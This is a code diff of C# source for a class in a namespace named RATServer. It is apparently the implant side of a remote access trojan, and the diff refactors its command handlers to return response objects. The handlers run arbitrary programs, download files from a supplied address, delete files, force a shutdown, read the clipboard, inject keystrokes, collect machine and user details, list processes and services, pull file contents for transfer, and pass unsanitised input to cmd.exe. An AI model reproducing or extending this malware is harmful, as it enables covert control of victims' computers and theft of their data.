@@ -13,81 +13,111 @@ namespace RATServer
 {
     public class Functions
     {
-        public static void Message(string Msg)
+        public static Response Message(string Msg)
         {
+            Response r = new Response();
             MessageBox.Show(Msg);
+            r.Type = "Message";
+            r.Msg = "Message Success";
+            return r;
         }
-        public static void Run(string Path)
+        public static Response Run(string Path)
         {
+            Response r = new Response();
             Process.Start(Path);
+            r.Type = "Message";
+            r.Msg = "Run Success";
+            return r;
         }
-        public static string PCInfo()
+        public static Response PCInfo()
         {
-            string x = "Details" + Environment.NewLine + "UserName: " + Environment.UserName + Environment.NewLine + "Machine Name: " + Environment.MachineName + Environment.NewLine + "OS: " + Environment.OSVersion.ToString() + Environment.NewLine + "UserDomainName: " + Environment.UserDomainName + Environment.NewLine + "Directory: " + Environment.CurrentDirectory;
-            return x;
+            Response r = new Response();
+            r.Type = "Message";
+            r.Msg = "Details" + Environment.NewLine + "UserName: " + Environment.UserName + Environment.NewLine + "Machine Name: " + Environment.MachineName + Environment.NewLine + "OS: " + Environment.OSVersion.ToString() + Environment.NewLine + "UserDomainName: " + Environment.UserDomainName + Environment.NewLine + "Directory: " + Environment.CurrentDirectory;
+            return r;
         }
-        public static string Processes()
+        public static Response Processes()
         {
-            string x = "";
-            foreach (Process p in Process.GetProcesses()) x += p.ProcessName + Environment.NewLine;
-            return x;
+            Response r = new Response();
+            r.Type = "Message";
+            foreach (Process p in Process.GetProcesses()) r.Msg += p.ProcessName + Environment.NewLine;
+            return r;
         }
-        public static string Delete(string Path)
+        public static Response Delete(string Path)
         {
-            string x;
+            Response r = new Response();
+            r.Type = "Message";
             if (File.Exists(Path))
             {
                 File.Delete(Path);
-                x = "Delete Success";
-            } else x = "File Not Found";
-            return x;
+                r.Msg = "Delete Success";
+            } else r.Msg = "File Not Found";
+            return r;
         }
-        public static void Download(string IP, string Path)
+        public static Response Download(string IP, string Path)
         {
+            Response r = new Response();
+            r.Type = "Message";
             using (var c = new WebClient())
             {
                 c.DownloadFile(IP, Path);
             }
+            r.Msg = "Download Success";
+            return r;
         }
-        public static void ShutDown()
+        public static Response ShutDown()
         {
+            Response r = new Response();
+            r.Type = "Message";
             Process.Start("cmd.exe shutdown -s -f -t 00");
+            r.Msg = "Shutdown Success";
+            return r;
         }
-        public static string ClipBoard()
+        public static Response ClipBoard()
         {
-            return Clipboard.GetText();
+            Response r = new Response();
+            r.Type = "Message";
+            r.Msg = Clipboard.GetText();
+            return r;
         }
-        public static void KeyPress(string Keys)
+        public static Response KeyPress(string Keys)
         {
+            Response r = new Response();
+            r.Type = "Message";
             SendKeys.SendWait(Keys);
+            r.Msg = "SendKeys Success";
+            return r;
         }
         public static Response Retrieve(string Dir)
         {
-            //issues with large files
+            //issues with large files likely due to predetermined connection buffer size
             Response r = new Response();
             r.Type = "Data";
             r.Msg = Path.GetFileName(Dir);
             r.Data = File.ReadAllBytes(Dir);
             return r;
         }
-        public static string Services()
+        public static Response Services()
         {
-            string x = "";
+            Response r = new Response();
+            r.Type = "Message";
             ServiceController[] sc = ServiceController.GetServices();
-            foreach (ServiceController s in sc) x += s.DisplayName + Environment.NewLine;
-            return x;
+            foreach (ServiceController s in sc) r.Msg += s.DisplayName + Environment.NewLine;
+            return r;
         }
-        public static string Search(string Path)
+        public static Response Search(string Path)
         {
+            Response r = new Response();
+            r.Type = "Message";
             Process p = new Process();
             p.StartInfo.UseShellExecute = false;
             p.StartInfo.RedirectStandardOutput = true;
             p.StartInfo.FileName = "cmd.exe";
             p.StartInfo.Arguments = "/c dir " + Path;
             p.Start();
-            string o = p.StandardOutput.ReadToEnd();
+            r.Msg = p.StandardOutput.ReadToEnd();
             p.WaitForExit();
-            return o;
+            return r;
         }
         public static byte[] ScreenShot(string Path)
         {
